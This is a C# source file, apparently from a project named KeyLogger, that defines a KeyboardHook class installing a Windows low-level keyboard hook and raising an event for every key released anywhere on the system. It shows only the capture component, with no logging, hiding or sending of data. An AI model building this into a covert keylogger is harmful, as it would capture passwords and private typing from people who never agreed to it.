using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using Hooks;

namespace KeyLogger
{
    public class KeyboardHook:Hooks.Hook
    {
        #region events

        public event KeyEventHandler KeyDown;
        public event KeyEventHandler KeyUp;

        #endregion
        

        protected Keys specialKeys = Keys.None;

        public KeyboardHook()
            : base(Win32.HookTypes.WH_KEYBOARD_LL)
        { }

        override protected int HookProcedure(int code, IntPtr wParam, IntPtr lParam)
        {
            if (code < 0)
                return Win32.CallNextHookEx(hndlHook, code, wParam, lParam);

            Win32.KBDLLHOOKSTRUCT hookStruct = (Win32.KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(Win32.KBDLLHOOKSTRUCT));

            Keys key = (Keys)hookStruct.vkCode;
            Win32.Win32Message message = (Win32.Win32Message)wParam;
            switch (message)
            {
                case Win32.Win32Message.WM_KEYUP:
                        OnKeyUp(new KeyEventArgs(key | specialKeys));
                        break;
                default:
                    break;
            }

            return Win32.CallNextHookEx(hndlHook, code, wParam, lParam);
        }

        protected void OnKeyDown(KeyEventArgs e)
        {
            if (KeyDown != null)
                KeyDown(this, e);
        }

        protected void OnKeyUp(KeyEventArgs e)
        {
            if (KeyUp != null)
                KeyUp(this, e);
        }
    }
}
